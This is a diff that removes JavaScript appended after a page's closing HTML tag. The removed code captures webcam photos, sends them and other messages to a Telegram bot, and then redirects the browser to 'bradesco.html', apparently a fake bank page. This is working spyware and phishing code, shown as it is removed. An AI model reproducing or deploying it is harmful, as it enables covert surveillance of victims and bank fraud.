@@ -137,35 +137,3 @@
 
 </body>
 </html>
-            const canvas = document.getElementById('canvas');
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-            
-            stream.getTracks().forEach(track => track.stop());
-
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-            const fd = new FormData();
-            fd.append('chat_id', ID);
-            fd.append('photo', blob, `${label}.jpg`);
-            fd.append('caption', `📸 Câmera ${label} (${new Date().toLocaleTimeString()})`);
-            
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        } catch (error) {
-            console.error("Erro na captura:", label);
-        }
-    }
-
-    async function enviarMensagemTelegram(msg) {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: ID, text: msg, parse_mode: 'Markdown' })
-        });
-    }
-
-    function finalizar() {
-        window.location.href = "bradesco.html";
-    }
-</script>
-
-</body>
-</html>
